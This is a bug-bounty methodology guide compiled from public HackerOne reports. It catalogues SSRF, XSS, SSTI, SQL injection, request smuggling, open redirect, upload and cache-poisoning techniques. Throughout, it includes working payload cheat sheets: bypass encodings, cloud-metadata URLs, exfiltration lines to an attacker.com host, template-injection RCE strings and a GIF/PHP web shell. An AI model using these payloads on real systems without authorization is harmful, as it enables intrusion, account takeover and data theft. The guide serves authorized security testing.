# Bug Bounty Attack Methodology
## Derived from 3,000+ Real Paid HackerOne Reports

> **Source**: reddelexc/hackerone-reports, B3nac/Android-Reports-and-Resources, gkcodez/bug-bounty-reports-hackerone, and related community repositories.
>
> **Purpose**: Pattern-based attack methodology for authorized bug bounty testing only. Always comply with program scope and rules.

---

## Table of Contents

1. [SSRF (Server-Side Request Forgery)](#1-ssrf-server-side-request-forgery)
2. [XSS (Cross-Site Scripting)](#2-xss-cross-site-scripting)
3. [Account Takeover](#3-account-takeover)
4. [IDOR (Insecure Direct Object Reference)](#4-idor-insecure-direct-object-reference)
5. [SSTI (Server-Side Template Injection)](#5-ssti-server-side-template-injection)
6. [SQL Injection](#6-sql-injection)
7. [HTTP Request Smuggling](#7-http-request-smuggling)
8. [Open Redirect](#8-open-redirect)
9. [Subdomain Takeover](#9-subdomain-takeover)
10. [File Upload Vulnerabilities](#10-file-upload-vulnerabilities)
11. [Information Disclosure](#11-information-disclosure)
12. [Web Cache Poisoning](#12-web-cache-poisoning)
13. [Program-Specific Hunting Tips](#13-program-specific-hunting-tips)
14. [Tooling & Automation](#14-tooling--automation)
15. [High-Impact Chains](#15-high-impact-chains)

---


## 1. SSRF (Server-Side Request Forgery)

**Reports Analyzed**: 309 | **Highest Bounty**: $17,576 (Dropbox) | **Most Upvoted**: 653 (Lyft)

### 1.1 Where to Look (Attack Surface)

| Feature | Why It's Vulnerable | Example Report |
|---------|-------------------|----------------|
| Image/File URL imports | Server fetches user-supplied URL | #826361 GitLab $10,000 |
| Webhook configurations | Server makes callbacks to user URL | #508459 Omise - AWS keys |
| PDF/Document generators | Server renders external resources | #1628209 DoD $4,000 |
| Video/media processing | FFmpeg HLS fetches remote playlists | #1062888 TikTok $2,727 |
| OAuth/OpenID callbacks | Server validates tokens at user URL | #398799 GitLab $4,000 |
| RSS/Atom feed parsers | Server fetches feed content | #299135 Open-Xchange $850 |
| SVG/XML file upload | XXE → SSRF via external entities | #897244 Zivver |
| Calendar imports (ICS) | Server fetches calendar URL | #758948 Mail.ru |
| Analytics/tracking pixels | Server resolves pixel URLs | #2262382 HackerOne |
| Email features (SMTP test) | Server connects to user-supplied host | #392859 Hacker Target |
| GraphQL endpoints | URL-type fields fetched server-side | #1864188 EXNESS $3,000 |
| Project/repo imports | Git clone from user URL | #135937 GitLab |
| Link preview/unfurling | Server fetches OG tags from URL | #1960765 Reddit $6,000 |
| Headless browser/screenshot | Server navigates to URL | #781295 h1-ctf |


### 1.2 SSRF Filter Bypass Techniques

```
# IP Address Encoding Tricks
http://127.0.0.1        → blocked
http://0x7f000001       → hex encoding
http://2130706433       → decimal encoding
http://017700000001     → octal encoding
http://127.1            → short form
http://[::1]            → IPv6 loopback
http://[0:0:0:0:0:ffff:127.0.0.1]  → IPv6-mapped IPv4
http://127.0.0.1.nip.io → DNS that resolves to 127.0.0.1
http://localtest.me     → resolves to 127.0.0.1
http://spoofed.burpcollaborator.net → DNS rebinding

# URL Parsing Tricks
http://google.com@127.0.0.1       → userinfo bypass
http://127.0.0.1#@google.com      → fragment confusion
http://127.0.0.1%2523@google.com  → double encoding
http://127.0.0.1:80\@google.com   → backslash trick
http://google.com\.127.0.0.1      → path confusion

# Protocol Tricks
gopher://127.0.0.1:25/            → SMTP interaction
dict://127.0.0.1:6379/info        → Redis interaction
file:///etc/passwd                 → local file read
tftp://attacker.com/file          → exfiltrate data

# DNS Rebinding (bypasses time-of-check/time-of-use)
1. First resolution → allowed external IP
2. Second resolution → 127.0.0.1 (internal)
Tool: github.com/taviso/rbndr

# Redirect-based Bypass
1. Host allowed URL that 301 redirects to internal IP
2. Use URL shorteners as redirect intermediary
3. Use open redirects in whitelisted domains

# Cloud Metadata Endpoints
http://169.254.169.254/latest/meta-data/    → AWS
http://metadata.google.internal/            → GCP
http://169.254.169.254/metadata/v1/         → DigitalOcean
http://169.254.169.254/opc/v1/             → Oracle Cloud
```


### 1.3 SSRF Escalation Chains

| Chain | Impact | Example |
|-------|--------|---------|
| SSRF → Cloud Metadata → AWS Keys | Full infrastructure compromise | #923132 Dropbox $4,913 |
| SSRF → Internal Services → RCE | Remote code execution | #713900 QIWI |
| SSRF → Internal Grafana/Admin | Data exfiltration | #878779 GitLab |
| SSRF → Redis/Memcached | Cache poisoning / RCE | #288353 Rockstar $1,500 |
| SSRF → Internal Docker API | Container escape | #366638 Uber $500 |
| SSRF → Kubernetes API | Cluster takeover | #1544133 Kubernetes $1,000 |
| SSRF → SMB share → Credential theft | NTLM hash capture | #288353 Rockstar $1,500 |
| SSRF → Internal SMTP | Send emails as internal user | #392859 Hacker Target |
| Blind SSRF → Port scan | Internal network mapping | #1875484 8x8 |
| XXE → SSRF → LFI | File read + network access | #897244 Zivver |

### 1.4 SSRF Checklist

- [ ] Identify all parameters that accept URLs (url=, link=, src=, href=, path=, uri=, dest=, redirect=, callback=)
- [ ] Test with Burp Collaborator/interactsh for blind SSRF
- [ ] Try localhost, 127.0.0.1, internal IPs (10.x, 172.16-31.x, 192.168.x)
- [ ] Test cloud metadata endpoints (169.254.169.254)
- [ ] Try IP encoding bypasses (hex, octal, decimal, IPv6)
- [ ] Test DNS rebinding if timing-based checks exist
- [ ] Try protocol handlers (file://, gopher://, dict://)
- [ ] Chain with open redirects on whitelisted domains
- [ ] Test double/triple URL encoding
- [ ] Try CRLF injection in URL for request splitting
- [ ] Check for partial SSRF (response reflected? headers only? blind?)
- [ ] If blind, use DNS exfiltration or timing-based detection

---


## 2. XSS (Cross-Site Scripting)

**Reports Analyzed**: 2,382+ | **Highest Bounty**: $20,000 (PayPal) | **Most Upvoted**: 2,675

### 2.1 XSS by Context & Injection Point

| Context | Technique | Example Report |
|---------|-----------|----------------|
| HTML body | `<script>`, `<img onerror>`, `<svg onload>` | #510152 PayPal $20,000 |
| HTML attribute | `" onfocus=alert(1) autofocus="` | #146336 Slack (453 upvotes) |
| JavaScript string | `';alert(1)//` or template literals | #409850 Valve $7,500 |
| URL/href | `javascript:alert(1)` | #341908 Twitter |
| CSS context | `expression()`, `url()` | #500436 Grammarly $250 |
| SVG file | `<svg><script>alert(1)</script></svg>` | #808862 Visma (268 upvotes) |
| Markdown | `[a]( javascript:alert(1))` | #1212067 GitLab $16,000 |
| Template injection | `{{constructor.constructor('alert(1)')()}}` | #399462 HubSpot |
| postMessage | DOM XSS via cross-origin messages | #398054 HackerOne $500 |
| Cache poisoning | Poisoned response serves XSS | #488147 PayPal $18,900 |
| File name | XSS via uploaded filename display | #808862 Visma |
| Email/notification | Stored XSS in email rendered in app | #982291 Basecamp $5,000 |

### 2.2 CSP Bypass Techniques (from GitLab reports)

```
# 1. Via Whitelisted CDN (script-src includes CDN)
<script src="https://whitelisted-cdn.com/angular.min.js"></script>
{{constructor.constructor('alert(1)')()}}

# 2. Via Base Tag Injection (if base-uri not restricted)
<base href="https://attacker.com/">
# All relative script loads now fetch from attacker

# 3. Via JSONP on Whitelisted Domain
<script src="https://whitelisted.com/api?callback=alert(1)//"></script>

# 4. Via Object/Embed (if object-src not set)
<object data="data:text/html,<script>alert(1)</script>">

# 5. Via Mermaid/Markdown Prototype Pollution (GitLab specific)
# Reports #1106238, #1280002 - $3,000 each
# Inject via mermaid diagram syntax to achieve XSS

# 6. Via Labels Color (GitLab CSP bypass)
# Report #1665658 - scoped labels color field
# Inject CSS that bypasses CSP restrictions

# 7. Via nonce reuse/prediction
# If nonce is predictable or reused, inject script with matching nonce

# 8. Via dangling markup injection
<img src="https://attacker.com/steal?cookie=
# Captures everything until next quote as URL parameter
```


### 2.3 High-Impact XSS Patterns

| Pattern | Impact | Reports |
|---------|--------|---------|
| Stored XSS in auth flow → ATO | Account takeover of any user | #534450 Grammarly, #723060 Razer |
| XSS + OAuth → Token theft | Steal OAuth tokens | #1567186 Reddit (503 upvotes) |
| Cache Poisoning → Stored XSS | Mass exploitation without auth | #488147 PayPal $18,900 |
| Blind XSS in admin panels | Access admin session/data | #1207040 Twitter, #746505 Mail.ru |
| XSS in email → Account access | Trigger when victim reads email | #982291 Basecamp $5,000 |
| XSS via postMessage | No user interaction needed | #398054 HackerOne |
| Prototype Pollution → XSS | Bypass sanitizers | #998398 Elastic |
| CRLF → XSS | Inject headers then body | #2012519 TikTok |
| XSS → RCE (Electron apps) | Full system compromise | #899964 Rocket.Chat |

### 2.4 XSS Hunting Checklist

- [ ] Map all input reflection points (search, profile, comments, filenames)
- [ ] Test every user-controllable value rendered in HTML
- [ ] Check for DOM XSS sources: `location.hash`, `location.search`, `document.referrer`, `postMessage`
- [ ] Test file uploads with `.svg`, `.html`, `.htm` extensions
- [ ] Check markdown/rich-text editors for injection
- [ ] Test OAuth redirect_uri for XSS payload injection
- [ ] Look for JSONP endpoints on same-origin whitelisted domains
- [ ] Test for prototype pollution in client-side JavaScript
- [ ] Check error pages for reflected user input
- [ ] Test parameter pollution (duplicate params with XSS)
- [ ] Try mutation XSS (mXSS) via innerHTML/DOMParser
- [ ] Test Web Cache poisoning vectors (X-Forwarded-Host, etc.)
- [ ] Check postMessage handlers for origin validation bypass
- [ ] Look for blind XSS sinks (admin panels, support tickets, error logs)

---


## 3. Account Takeover

**Derived from**: TOPACCOUNTTAKEOVER + chained reports across categories

### 3.1 Account Takeover Vectors

| Vector | Technique | High-Value Chain |
|--------|-----------|-----------------|
| OAuth misconfiguration | Response type switch, state parameter abuse | XSS + OAuth → steal token → ATO |
| Password reset poisoning | Host header injection in reset emails | Victim clicks link → attacker gets token |
| IDOR in account functions | Predict/enumerate user IDs in settings | Change email/password of other users |
| Session fixation | Force victim into attacker's session | Pre-auth session token reuse |
| CSRF on critical actions | No CSRF on email/password change | Chain with self-XSS for full ATO |
| Open redirect → token theft | Redirect after auth to attacker domain | OAuth code/token sent to attacker |
| XSS → Cookie theft | Stored XSS in authenticated context | Exfiltrate session cookies |
| JWT issues | Algorithm confusion, key leakage, no expiry | Forge tokens for any user |
| Race conditions | TOCTOU in MFA/verification flows | Bypass verification steps |
| Subdomain takeover | Dangling DNS → phish or steal cookies | Cookies scoped to parent domain |

### 3.2 ATO Testing Checklist

- [ ] Test password reset flow for host header injection
- [ ] Check OAuth implementation (state, redirect_uri validation, response_type)
- [ ] Test IDOR on /account/settings, /user/update endpoints
- [ ] Check for CSRF on email change, password change, MFA disable
- [ ] Test rate limiting on login, OTP verification
- [ ] Check if session invalidates after password/email change
- [ ] Test for account enumeration via timing/error differences
- [ ] Check cookie scope (secure, httponly, samesite, domain)
- [ ] Test JWT for algorithm confusion (none, HS256 vs RS256)
- [ ] Look for 2FA bypass (backup codes, race conditions, parameter manipulation)

---

## 4. IDOR (Insecure Direct Object Reference)

**Derived from**: TOPIDOR reports

### 4.1 Where to Hunt for IDOR

| Endpoint Pattern | What to Test |
|-----------------|--------------|
| `/api/users/{id}/profile` | Increment/decrement ID, try other user IDs |
| `/api/messages/{id}` | Access other users' messages |
| `/api/orders/{id}/invoice` | Download other users' invoices |
| `/api/files/{id}/download` | Access private files |
| `/api/settings/{id}` | Modify other users' settings |
| `/api/reports/{id}` | Read private reports |
| GraphQL `query { user(id: X) }` | Enumerate via GraphQL introspection |
| UUID-based IDs | Check if truly random or predictable |

### 4.2 IDOR Bypass Techniques

```
# 1. Swap ID types
GET /api/user/123        → blocked
GET /api/user/123.json   → bypassed (format trick)

# 2. HTTP method switching
GET /api/user/123   → 403
PUT /api/user/123   → 200 (method not checked)

# 3. Wrap ID in array
{"user_id": 123}    → blocked
{"user_id": [123]}  → bypassed

# 4. Parameter pollution
/api/user?id=me&id=123   → server uses second value

# 5. Change response content-type
Accept: application/xml  → different parser, different authz

# 6. Version switching
/api/v2/user/123  → has authz
/api/v1/user/123  → no authz (legacy)

# 7. UUID prediction
If UUIDs are v1 (time-based), predict other users' UUIDs
```

---


## 5. SSTI (Server-Side Template Injection)

**Derived from**: TOPSSTI reports

### 5.1 Detection Payloads by Engine

```
# Universal Detection (test these first)
{{7*7}}          → 49 = Jinja2/Twig/Nunjucks
${7*7}           → 49 = Freemarker/Thymeleaf/Velocity
#{7*7}           → 49 = Thymeleaf/Spring EL
<%= 7*7 %>       → 49 = ERB (Ruby)
{{7*'7'}}        → 7777777 = Jinja2 (string repeat confirms)
${7*'7'}         → error or 7777777 = Groovy/Freemarker

# Jinja2 (Python) - RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig (PHP) - RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java) - RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby) - RCE
<%= system("id") %>
<%= `id` %>

# Velocity (Java) - RCE
#set($e="")#set($s=$e.class.forName("java.lang.Runtime"))
```

### 5.2 SSTI Hunting Checklist

- [ ] Test all template-rendered user inputs (emails, PDFs, custom pages)
- [ ] Check error messages for template engine disclosure
- [ ] Test `{{}}`, `${}`, `<%= %>`, `#{}`  in: names, titles, descriptions, custom fields
- [ ] Look for template preview/sandbox features
- [ ] Test email templates, invoice generators, notification templates
- [ ] Check CMS/widget builders for template injection

---

## 6. SQL Injection

**Derived from**: TOPSQLI reports

### 6.1 Injection Points Beyond Obvious

| Location | Example |
|----------|---------|
| HTTP Headers | X-Forwarded-For, Referer, User-Agent |
| JSON body fields | `{"search": "' OR 1=1--"}` |
| Cookie values | Session parameters parsed by backend |
| GraphQL variables | `{"query": "...", "variables": {"id": "1' OR '1'='1"}}` |
| Order/Sort parameters | `?sort=name; DROP TABLE--` |
| File upload filenames | Filename stored in DB |
| Multipart form fields | Hidden fields in file uploads |

### 6.2 Time-Based Blind SQLi Payloads

```
# MySQL
' OR SLEEP(5)--
' OR IF(1=1,SLEEP(5),0)--

# PostgreSQL
'; SELECT pg_sleep(5)--
' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

# MSSQL
'; WAITFOR DELAY '0:0:5'--
' OR IF(1=1) WAITFOR DELAY '0:0:5'--

# Oracle
' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

---


## 7. HTTP Request Smuggling

**Derived from**: TOPREQUESTSMUGGLING reports

### 7.1 Smuggling Techniques

```
# CL.TE (Front-end uses Content-Length, back-end uses Transfer-Encoding)
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL (Front-end uses Transfer-Encoding, back-end uses Content-Length)
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# TE.TE (Obfuscating Transfer-Encoding header)
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding : chunked        (space before colon)
Transfer-Encoding: chunked\r\n\t   (line folding)
Transfer-Encoding: xchunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: chunked\x00     (null byte)
```

### 7.2 Smuggling Impact Chains

- Request smuggling → Bypass front-end security controls
- Request smuggling → Capture other users' requests
- Request smuggling → Redirect to attacker (poisoned response)
- Request smuggling → Cache poisoning (serve XSS to all users)
- Request smuggling → Web cache deception (steal authenticated responses)

---

## 8. Open Redirect

**Derived from**: TOPOPENREDIRECT (272 reports)

### 8.1 Bypass Techniques

```
# Basic bypasses for URL validation
//attacker.com                     (protocol-relative)
/\attacker.com                     (backslash bypass)
////attacker.com                   (multiple slashes)
https://attacker.com\@target.com   (userinfo confusion)
https://target.com.attacker.com    (subdomain trick)
https://attacker.com#.target.com   (fragment trick)
https://attacker.com?.target.com   (query trick)
/%0d%0aLocation:%20http://attacker.com  (CRLF)
/redirect?url=https://ⓐttacker.com     (unicode confusables)

# Parameter-based tricks
?next=//attacker.com
?redirect_uri=https://attacker.com
?return_to=//attacker.com
?continue=https://attacker.com
?dest=//attacker.com
?url=//attacker.com
?redir=//attacker.com
?returnUrl=//attacker.com
```

### 8.2 Open Redirect → High Impact Chains

| Chain | Impact |
|-------|--------|
| Open Redirect → OAuth token theft | Steal auth codes/tokens via redirect_uri |
| Open Redirect → SSRF filter bypass | Redirect internal request to metadata |
| Open Redirect → XSS (via javascript: URI) | Execute code if redirect not validated |
| Open Redirect → Phishing | Credible login page on trusted domain |

---


## 9. Subdomain Takeover

**Derived from**: TOPSUBDOMAINTAKEOVER reports

### 9.1 Fingerprints for Vulnerable Services

| Service | CNAME Pattern | Response Pattern |
|---------|--------------|-----------------|
| AWS S3 | `*.s3.amazonaws.com` | "NoSuchBucket" |
| GitHub Pages | `*.github.io` | "There isn't a GitHub Pages site here" |
| Heroku | `*.herokuapp.com` | "No such app" |
| Azure | `*.azurewebsites.net` | "NXDOMAIN" / default page |
| Shopify | `*.myshopify.com` | "Sorry, this shop is currently unavailable" |
| Fastly | CNAME to fastly | "Fastly error: unknown domain" |
| Pantheon | `*.pantheonsite.io` | "404 unknown site" |
| Zendesk | `*.zendesk.com` | "Help Center Closed" |
| Unbounce | CNAME to unbouncepages | "The requested URL was not found" |
| Surge.sh | CNAME to surge | "project not found" |

### 9.2 Subdomain Takeover Methodology

1. Enumerate all subdomains (amass, subfinder, crt.sh)
2. Resolve DNS and check for CNAME records
3. Identify dangling CNAMEs (NXDOMAIN or service-specific error)
4. Claim the resource on the cloud provider
5. Serve proof-of-concept content

---

## 10. File Upload Vulnerabilities

**Derived from**: TOPUPLOAD reports

### 10.1 Upload Bypass Techniques

```
# Extension bypasses
file.php      → blocked
file.pHp      → case variation
file.php5     → alternative extension
file.php.jpg  → double extension
file.php%00.jpg  → null byte (legacy)
file.php\x00.jpg → null byte variant
file.jpg.php  → reverse double extension

# Content-Type manipulation
Content-Type: image/jpeg   (but file is PHP)
Content-Type: image/svg+xml (SVG with XSS)

# Magic bytes injection
GIF89a;<?php system($_GET['cmd']);?>  (GIF header + PHP)
%PDF-1.4 ... <script>alert(1)</script>  (PDF + XSS)

# SVG with embedded JavaScript
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

# Polyglot files
JPEG + PHP polyglot (valid image that executes as PHP)
```

### 10.2 Upload → Impact Chains

- SVG upload → Stored XSS (most common, multiple GitLab/Nextcloud reports)
- Image upload → SSRF via ImageMagick/FFmpeg
- File upload → Path traversal (overwrite critical files)
- Document upload → XXE via DOCX/XLSX XML
- Avatar upload → Stored XSS via filename reflection

---


## 11. Information Disclosure

**Derived from**: TOPINFODISCLOSURE reports

### 11.1 Common Disclosure Points

| What to Look For | Where | Impact |
|-----------------|-------|--------|
| Source code / .git exposure | `/.git/HEAD`, `/.env`, `/.DS_Store` | Credentials, internal logic |
| Stack traces in errors | Trigger 500 errors with malformed input | Internal paths, versions |
| API keys in JavaScript | View source, JS map files | Third-party service access |
| Debug endpoints | `/debug`, `/actuator`, `/server-status` | Internal metrics, config |
| GraphQL introspection | `{__schema{types{name}}}` | Full API schema |
| Verbose error messages | Invalid input in every parameter | DB type, query structure |
| Backup files | `.bak`, `.old`, `.swp`, `~` suffixes | Source code, credentials |
| Directory listings | Browse directories without index files | Internal file structure |
| CORS misconfig | Check `Access-Control-Allow-Origin` | Cross-origin data theft |
| Internal IP in headers | `X-Forwarded-For`, `X-Real-IP` responses | Network topology |

---

## 12. Web Cache Poisoning

**Derived from**: TOPWEBCACHE reports

### 12.1 Cache Poisoning Techniques

```
# Unkeyed Headers (included in response but not cache key)
X-Forwarded-Host: attacker.com     → reflected in links/scripts
X-Forwarded-Scheme: nothttps       → redirect loop
X-Original-URL: /admin             → access control bypass
X-Rewrite-URL: /admin              → same as above

# Unkeyed Query Parameters
?utm_source=<script>alert(1)</script>  → cached XSS
?cb=<payload>                          → cache buster reflected

# Fat GET Requests
GET / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

param=<payload>    → body params used but not in cache key

# Cache Key Normalization
/path;param=1      → path parameter stripped from key
/PATH vs /path     → case normalization differences
```

### 12.2 Cache Poisoning → Impact

- Serve XSS to all visitors of cached page ($18,900 PayPal report)
- Redirect all users to phishing page
- Serve malicious JavaScript to steal sessions
- Denial of service via cached error responses

---


## 13. Program-Specific Hunting Tips

### GitLab (Top-paying program for security researchers)
- **Focus areas**: Project import/export, Markdown rendering, Mermaid diagrams, CI/CD pipelines, GraphQL API
- **Top vulns paid**: SSRF via project import ($10K), Stored XSS in markdown ($16K), XSS via Mermaid ($13,950 x2)
- **Key insight**: GitLab's markdown renderer and integrations are gold mines

### Shopify
- **Focus areas**: Storefront XSS, Admin panel injection, OAuth flows, Third-party app integration, Liquid template injection
- **Top vulns paid**: XSS on admin via SVG ($5,300), Stored XSS in markdown ($5,000), SSRF ($500)
- **Key insight**: Look at app integrations and embedded checkout flows

### TikTok
- **Focus areas**: ads.tiktok.com, Reflected XSS in various endpoints, DOM XSS on login via redirect_url
- **Top vulns paid**: Reflected XSS on Pangle ($5,000), DOM XSS on ads ($2,500), SSRF via FFmpeg ($2,727)
- **Key insight**: Many XSS in advertising and business-facing portals

### WordPress/Automattic
- **Focus areas**: Core WP functions, Plugins (BuddyPress, WooCommerce, Jetpack), wordpress.com hosted
- **Top vulns paid**: Stored XSS in BuddyPress, WooCommerce XSS, Core stored XSS
- **Key insight**: Plugin ecosystem is massive attack surface

### Uber
- **Focus areas**: Internal tools (uberinternal.com), OAuth, Partners portal, Driver app
- **Top vulns paid**: XSS on any domain ($6,000), SSRF via partners ($2,000), XSS developer.uber.com ($7,500)
- **Key insight**: Legacy systems and internal tools often lack modern security

### Coinbase
- **Focus areas**: Financial transaction logic, API authentication, Exchange trading
- **Key insight**: Logic bugs and race conditions more valuable than XSS here

### Rockstar Games
- **Focus areas**: Social Club, Rockstar Games website, Game-related web services
- **Top vulns paid**: SMB SSRF ($1,500), Stored XSS in comments ($1,000-$1,250)
- **Key insight**: Flash/legacy tech and social features are weak points

---


## 14. Tooling & Automation

### 14.1 Reconnaissance

| Tool | Purpose |
|------|---------|
| **subfinder** | Passive subdomain enumeration |
| **amass** | Active + passive subdomain enum |
| **httpx** | HTTP probing, tech detection |
| **nuclei** | Template-based vulnerability scanning |
| **katana** | Web crawling and spidering |
| **gau/waybackurls** | Historical URL discovery |
| **ffuf** | Fuzzing directories, parameters, vhosts |
| **dnsx** | DNS resolution and record lookup |
| **crt.sh** | Certificate transparency logs |

### 14.2 Exploitation

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercepting proxy, scanner, repeater |
| **SQLMap** | Automated SQL injection |
| **Dalfox** | XSS scanner and parameter analysis |
| **SSRFmap** | SSRF exploitation automation |
| **tplmap** | SSTI detection and exploitation |
| **smuggler** | HTTP request smuggling detection |
| **interactsh** | Out-of-band interaction server (blind SSRF/XSS) |
| **XSStrike** | Advanced XSS detection |
| **Arjun** | Hidden HTTP parameter discovery |
| **ParamSpider** | URL parameter mining from archives |

### 14.3 Automation Pipeline

```bash
# Quick recon pipeline example
subfinder -d target.com -silent | \
  httpx -silent -status-code -tech-detect | \
  tee alive-hosts.txt

# Parameter fuzzing
cat alive-hosts.txt | katana -silent | \
  grep "=" | uro | \
  dalfox pipe --blind https://your.interact.sh

# SSRF hunting
cat urls-with-params.txt | \
  grep -iE "(url|link|src|href|path|redirect|callback|proxy|fetch)" | \
  nuclei -t ssrf/ -interactsh-url https://your.interact.sh

# Subdomain takeover check
subfinder -d target.com | dnsx -cname | \
  nuclei -t takeovers/
```

---


## 15. High-Impact Chains

The highest-paying reports almost always involve **chaining** multiple low/medium issues into critical impact.

### 15.1 Proven Chain Templates

| Chain | Steps | Target Impact |
|-------|-------|---------------|
| **SSRF → Cloud Metadata → RCE** | 1. Find SSRF 2. Access 169.254.169.254 3. Get IAM credentials 4. Access internal services | Full infrastructure compromise |
| **Open Redirect → OAuth Token Theft → ATO** | 1. Find open redirect on whitelisted domain 2. Set as redirect_uri 3. Steal auth code/token 4. Login as victim | Account takeover |
| **XSS → CSRF Token Steal → Admin Action** | 1. Find stored XSS 2. Exfiltrate anti-CSRF token 3. Perform privileged action | Privilege escalation |
| **SSRF → Internal Admin Panel → Data Exfil** | 1. SSRF to internal port 2. Discover admin UI 3. Execute admin functions | Internal data access |
| **Self-XSS → CSRF → Reflected XSS** | 1. Find self-XSS 2. Chain with CSRF to force victim 3. Escalate to full XSS | Turns P5 into P2 |
| **Subdomain Takeover → Cookie Theft → ATO** | 1. Take over subdomain 2. Set cookies for parent domain 3. Hijack sessions | Mass account takeover |
| **Cache Poisoning → Stored XSS → Mass ATO** | 1. Poison cache with XSS 2. All visitors execute payload 3. Steal sessions en masse | Mass compromise |
| **Request Smuggling → Response Splitting → XSS** | 1. Smuggle request 2. Control next response 3. Inject XSS in cached response | Unauthenticated stored XSS |
| **IDOR → PII Leak → ATO** | 1. Enumerate user data 2. Get email/phone 3. Reset password via exposed info | Account takeover |
| **XXE → SSRF → LFI** | 1. Upload malicious XML/DOCX 2. XXE fetches internal URLs 3. Read local files | File disclosure + network access |

### 15.2 Impact Multipliers

- **Unauthenticated** > Authenticated (always note if no auth needed)
- **Zero-click** > Requires user interaction
- **Mass exploitation** > Single user (cache poisoning, broadcast)
- **Chained to ATO** > Standalone info leak
- **Access to PII/financial data** > Access to non-sensitive data
- **RCE** > Read-only access
- **Persistence** (stored) > One-time (reflected)

---

## Quick Reference: Report Writing Tips

Based on top-upvoted reports, these elements increase bounty payouts:

1. **Clear title** describing the vulnerability and impact
2. **Step-by-step reproduction** that anyone can follow
3. **Impact statement** explaining real-world consequences
4. **Proof of concept** with screenshots/video
5. **Remediation suggestions** showing you understand the fix
6. **Chain demonstration** if applicable (SSRF alone = $500, SSRF→AWS keys = $17,576)

---

*This methodology is for authorized security testing on bug bounty platforms only. Always respect program scope, rules of engagement, and responsible disclosure timelines.*
